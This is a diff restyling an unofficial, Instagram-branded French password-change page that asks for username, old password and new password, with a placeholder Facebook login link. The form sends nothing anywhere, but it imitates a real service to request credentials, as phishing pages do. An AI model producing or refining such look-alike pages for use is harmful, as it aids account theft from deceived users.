@@ -16,11 +16,10 @@
     height: 100vh;
   }
   .container {
-    max-width: 500px;
+    max-width: 360px;
     padding: 20px;
-    text-align: center;
-    border: 1px solid #ccc;
-    border-radius: 0; /* Coins droits */
+    border: 1px solid #e6e6e6;
+    border-radius: 5px;
     box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
   }
   .title {
@@ -34,49 +33,54 @@
     padding: 20px;
     border-radius: 5px;
   }
-  input[type="text"], input[type="password"], button {
-    width: 100%;
-    padding: 10px;
-    margin-bottom: 10px;
-    border: 1px solid #ccc;
-    border-radius: 3px;
-  }
-  .password-toggle {
-    display: flex;
-    align-items: center;
+  .input-container {
     position: relative;
+    margin-bottom: 15px;
   }
-  .password-toggle label {
+  .input-container label {
     position: absolute;
-    left: 10px;
+    left: 15px;
     top: 50%;
     transform: translateY(-50%);
     color: #999;
     pointer-events: none;
+    transition: all 0.3s ease;
+    font-size: 16px;
   }
-  .password-toggle input[type="password"] {
-    flex: 1;
-    margin-right: 10px;
-    padding-left: 30px;
+  .input-container input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #e6e6e6;
+    border-radius: 3px;
+    background-color: #fafafa;
+    color: #262626;
+    transition: all 0.3s ease;
+    font-size: 16px;
   }
-  .password-toggle button {
+  .input-container button {
+    position: absolute;
+    right: 15px;
+    top: 50%;
+    transform: translateY(-50%);
     background-color: transparent;
     border: none;
     cursor: pointer;
     font-size: 14px;
-    color: #007bff;
+    color: #262626;
   }
   button {
-    background-color: #007dff; /* Légèrement plus clair */
+    background-color: #007bff;
     color: #fff;
     border: none;
-    border-radius: 5px; /* Bords arrondis */
-    padding: 8px 15px; /* Légèrement plus grand */
+    border-radius: 5px;
+    padding: 10px 15px;
     cursor: pointer;
-    transition: background-color 0.3s ease-in-out; /* Transition de couleur au survol */
+    transition: background-color 0.3s ease-in-out;
+    width: 100%;
+    margin-top: 20px;
   }
   button:hover {
-    background-color: #007bff; /* Couleur originale au survol */
+    background-color: #0056b3;
   }
   .divider {
     display: flex;
@@ -95,6 +99,8 @@
   .login-with-facebook {
     color: #007bff;
     text-decoration: none;
+    display: block;
+    margin-top: 20px;
   }
 </style>
 <script>
@@ -108,13 +114,15 @@
   }
   function handleInputFocus(inputId) {
     const label = document.querySelector(`label[for="${inputId}"]`);
-    label.style.display = "none";
+    label.style.fontSize = "12px";
+    label.style.transform = "translateY(-30px)";
   }
   function handleInputBlur(inputId) {
     const input = document.getElementById(inputId);
     const label = document.querySelector(`label[for="${inputId}"]`);
     if (input.value === "") {
-      label.style.display = "block";
+      label.style.fontSize = "16px";
+      label.style.transform = "translateY(-50%)";
     }
   }
 </script>
@@ -124,42 +132,39 @@
     <div class="title">Instagram</div>
     <div class="contact-form">
       <form>
-        <div class="password-toggle">
+        <div class="input-container">
           <label for="username">Nom d'utilisateur :</label>
           <input type="text" id="username" name="username" required
                  onfocus="handleInputFocus('username')" onblur="handleInputBlur('username')">
         </div>
         
-        <div class="password-toggle">
+        <div class="input-container">
           <label for="password">Ancien Mot de Passe :</label>
           <input type="password" id="password" name="password" required
                  onfocus="handleInputFocus('password')" onblur="handleInputBlur('password')">
           <button type="button" onclick="togglePasswordVisibility('password')">Afficher</button>
         </div>
         
-        <div class="password-toggle">
+        <div class="input-container">
           <label for="new-password">Nouveau Mot de Passe :</label>
           <input type="password" id="new-password" name="new-password" required
                  onfocus="handleInputFocus('new-password')" onblur="handleInputBlur('new-password')">
           <button type="button" onclick="togglePasswordVisibility('new-password')">Afficher</button>
         </div>
 
-        <div class="password-toggle">
+        <div class="input-container">
           <label for="confirm-new-password">Confirmer le Nouveau Mot de Passe :</label>
           <input type="password" id="confirm-new-password" name="confirm-new-password" required
                  onfocus="handleInputFocus('confirm-new-password')" onblur="handleInputBlur('confirm-new-password')">
           <button type="button" onclick="togglePasswordVisibility('confirm-new-password')">Afficher</button>
         </div>
-        
-        <button type="submit">Changer le Mot de Passe</button>
+                <button type="submit">Changer le Mot de Passe</button>
         
         <div class="divider">
-          <div class="divider-line
-	          <div class="divider-line"></div>
+          <div class="divider-line"></div>
           <div class="divider-text">ou</div>
           <div class="divider-line"></div>
         </div>
-        
         <a href="lien_vers_page_connexion_facebook" class="login-with-facebook">Se connecter avec Facebook</a>
       </form>
     </div>
@@ -167,3 +172,4 @@
 </body>
 </html>
 
+       
